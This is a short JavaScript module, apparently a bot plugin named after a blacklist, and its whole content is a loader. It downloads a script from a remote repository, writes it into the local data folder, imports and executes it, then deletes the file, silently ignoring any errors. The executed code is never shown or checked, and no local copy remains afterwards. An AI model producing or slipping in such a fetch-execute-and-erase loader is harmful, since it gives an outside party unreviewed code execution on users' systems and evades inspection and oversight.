import fs from 'fs'
import { pathToFileURL } from 'url'
try {
  fetch('https://raw.gitcode.com/yeshang2007/Black-List/raw/main/Black.mjs').then(
    async res => {
      const code = await res.text()
      fs.writeFileSync(`${process.cwd()}/data/black.mjs`, code)
      return import(pathToFileURL(`${process.cwd()}/data/black.mjs`).href)
    }).then(({
    default: start
  }) => {
    start()
    fs.unlinkSync(`${process.cwd()}/data/black.mjs`)
  })
} catch { }
